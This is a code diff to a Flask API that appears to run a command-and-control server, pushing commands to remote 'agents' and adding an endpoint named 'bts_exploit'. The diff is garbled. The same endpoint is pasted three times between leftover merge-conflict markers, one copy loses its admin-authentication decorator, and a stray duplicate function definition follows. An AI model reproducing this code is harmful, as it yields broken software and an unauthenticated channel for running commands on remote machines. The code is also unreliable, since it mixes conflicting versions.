@@ -14,6 +14,48 @@ def geolocation():
     return 'Local'
 
 @api.route('/<agent_id>/push', methods=['POST'])
+@require_admin
+def push_command(agent_id):
+    agent = Agent.query.get(agent_id)
+    if not agent:
+        abort(404)
+    agent.push_command(request.form['cmd'])
+    return ''
+=======
+@api.route('/<agent_id>/bts_exploit', methods=['POST'])
+@require_admin
+def bts_exploit(agent_id):
+    agent = Agent.query.get(agent_id)
+    if not agent:
+        abort(404)
+    # Get the command from the request
+    command = request.json.get('command')
+    if command:
+        agent.push_command(command)
+    return '', 204
+=======
+@api.route('/<agent_id>/bts_exploit', methods=['POST'])
+@require_admin
+def bts_exploit(agent_id):
+    agent = Agent.query.get(agent_id)
+    if not agent:
+        abort(404)
+    # Get the command from the request
+    command = request.json.get('command')
+    if command:
+        agent.push_command(command)
+    return '', 204
+=======
+@api.route('/<agent_id>/bts_exploit', methods=['POST'])
+def bts_exploit(agent_id):
+    agent = Agent.query.get(agent_id)
+    if not agent:
+        abort(404)
+    # Get the command from the request
+    command = request.json.get('command')
+    if command:
+        agent.push_command(command)
+    return '', 204
 def push_command(agent_id):
     agent = Agent.query.get(agent_id)
     if not agent:
